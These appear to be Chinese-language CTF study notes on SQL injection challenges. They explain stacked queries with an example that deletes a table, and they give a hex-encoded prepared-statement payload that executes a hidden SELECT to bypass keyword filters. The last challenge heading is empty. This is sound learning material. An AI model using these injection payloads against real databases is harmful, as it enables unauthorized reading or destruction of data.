# [HCTF 2018]WarmUp

CVE-2018-12613

# [强网杯 2019]随便注

堆叠注入

> 在SQL中，以分号（;）表示一条语句的结束，
>
> select * from shop;delete from shop;表示查询数据后删除该表

预处理

> ​	绝大多数情况下，一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同，比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。
>
> ​	所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。
> ​	预编译语句的优势在于：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。

- 预处理语法

```mysql
# 定义模板语句
PREPARE stmt_name FROM preparable_stmt_sql;
# 设置值
SET @var_name = xxx;
# 执行预处理语句
EXECUTE stmt_name [USING @var_name [, @var_name] ...];
# 删除(释放)定义
{DEALLOCATE | DROP} PREPARE stmt_name;
```

- EXP

```sql
set @payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
prepare execsql from @payload;
execute execsql;
```

# [SUCTF 2019]EasySQL



